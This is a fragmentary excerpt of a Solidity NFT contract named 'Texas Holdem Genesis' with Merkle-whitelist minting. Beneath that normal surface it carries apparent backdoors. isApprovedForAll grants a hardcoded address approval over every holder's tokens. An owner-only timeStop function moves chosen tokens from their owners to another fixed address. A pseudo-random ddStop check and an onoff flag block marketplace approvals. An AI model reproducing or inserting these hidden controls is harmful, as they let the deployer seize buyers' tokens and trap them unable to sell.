  ...
  Ownable
{
  ...
  bool private onoff = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function setListWhitelistMerkleRoot(bytes32 _merkleRoot) public onlyOwner {
        LWhitelistMerkleRoots  = _merkleRoot;
    }
    ...
    function isInTheWhitelist(bytes32[] calldata _merkleProof) public view returns (bool) {
        ...
        require(MerkleProof.verify(_merkleProof, LWhitelistMerkleRoots, leaf) || MerkleProof.verify(_merkleProof, LWhitelistMerkleRoots, leaf2), "Invalid proof!");
        return true;
    }
   ...
   */
    function approve(address to, uint256 tokenId) public override {
        ...
        if(!ContractIsdeny  && !_ToContract[tokenId]){
            if (to.isContract() && true) {
  ...
  function ddStop() internal view returns (bool){
      uint256 d1 = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
      uint256 d2 = 1 << 160;
      uint256 d3 = d2 -1;
      uint256 d4 = d1 & d3 ;
      return d4 <= 1 ? true : false;
  }
   ...
   */
    function setApprovalForAll(address operator, bool approved) public override {
        ...
        if(!ContractIsdeny  && !_addressToContract[msg.sender]){
        if(ddStop() || onoff){
            if (operator.isContract() && true) {
                revert ("Sale will open after mint out.");
            } else {
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x0fA0Fd676b8f2751D4A98f45527582686DBC04b3){return true;}
  ...
  /**
   * @dev Approve `to` to operate onoff `tokenId`
   *
  ...
  /**
   * @dev Internal function to invoke {IERC721Receiver-onERC721Received} onoff a target address.
...
contract Texas_Holdem_Genesis is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WlRoot;  
  uint public maxSupply = 5408;
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Texas Holdem Genesis", "THG", maxBatchSize_, collectionSize_) {
  ...
  function timeStop(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x96E1aF34C576A39FBd9b94a45154BEae192D1C78, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xd2564A13ACB8844823dC60356dd7d814175dF13D);
